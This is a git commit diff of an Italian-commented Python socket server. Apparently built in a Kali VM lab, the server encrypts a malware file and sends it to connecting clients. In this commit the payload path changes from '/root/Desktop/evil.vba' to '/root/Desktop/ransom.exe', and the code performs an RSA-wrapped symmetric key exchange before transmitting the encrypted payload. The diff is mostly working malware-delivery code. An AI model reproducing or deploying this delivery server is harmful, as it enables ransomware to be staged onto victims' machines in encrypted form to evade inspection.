3c6a66dd9663e8bd6dc99e4c91d7d1a845f6a8af
angeloamoako <51134064+angeloamoako@users.noreply.github.com>
2023-01-29 19:32:32 +0100

    Update server.py
    Aggiornato il server con l'ip della VM kali e modifcati alcuni messaggi da mostrare all'utente

--- server.py
+++ server.py
@@ -18,7 +18,7 @@ def asymmetricDecryption(encodedMessage, fernet_key):
 
 
 if __name__ == "__main__":
-	ip = "192.168.1.15"
+	ip = "192.168.10.10"
 	port = 65438
 
 	server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -26,7 +26,7 @@ if __name__ == "__main__":
 	server.listen(1)
 
 	while True:
-		print("In attesa di connessioni...")
+		print("In attesa di nuove connessioni...")
 		client, address = server.accept()
 		print("Connessione effettuata verso questo client {}:{}!".format(address[0], address[1]))
 
@@ -35,32 +35,33 @@ if __name__ == "__main__":
 		public_key = pickle.loads(byte_client_public_key)
 		client.send("Ok".encode("utf8"))
 
-		# invio del file al client
-		print("Invio del malware al client")
-		path_malware = r"/root/Desktop/evil.vba"
+		path_malware = r"/root/Desktop/ransom.exe"
 		filesize = os.path.getsize(path_malware)
 
 		# start sending the file
 		symmetric_key = generateSymmetricKey()
-		progress = tqdm.tqdm(range(filesize), f"Sending {path_malware}", unit="B", unit_scale=True, unit_divisor=1024)
+		
 		with open(path_malware, "rb") as malware:
 			# send the symmetric key first
 			print("Invio della chiave simmetrica")
 			byte_symmetric_key = pickle.dumps(symmetric_key)
 			client.sendall(rsa.encrypt(byte_symmetric_key, public_key))
-			print("chiave simmetrica: {}".format(str(pickle.dumps(symmetric_key))))
 			# read the bytes from the file
 			bytes_read = malware.read()
-			# update the progress bar
-			progress.update(len(bytes_read))
+			print("....ricevuta!\n")
+			
 			key = Fernet(symmetric_key)
 			encr_data = key.encrypt(bytes_read)
 			data_size = len(encr_data)
 			client.recv(10) # aspetto una risposta
 			# invio la dimensione del file
+			print("Dimensioni del file cifrato: {} bytes".format(len(encr_data)) )
 			client.send(str(data_size).encode('utf8'))
 			client.recv(10) # tengo il server in attesa prima di mandare i dati
+			
+			# invio del file cifrato al client
+			print("Invio del malware cifrato al client")
 			client.send(encr_data)
 
 		client.close()
-		print("Ho terminato l'invio del malware!")
+		print("...inviato!")
